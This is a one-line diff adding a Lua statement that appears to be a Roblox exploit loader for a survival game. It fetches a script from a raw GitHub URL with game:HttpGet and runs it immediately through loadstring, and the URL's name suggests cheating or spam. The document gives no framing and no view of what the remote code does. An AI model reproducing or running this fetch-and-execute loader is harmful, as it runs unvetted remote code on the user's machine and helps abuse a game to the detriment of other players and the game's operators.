@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/new-map-fallen-survival-spam2-4eddavivl0hqeu.lua"))()
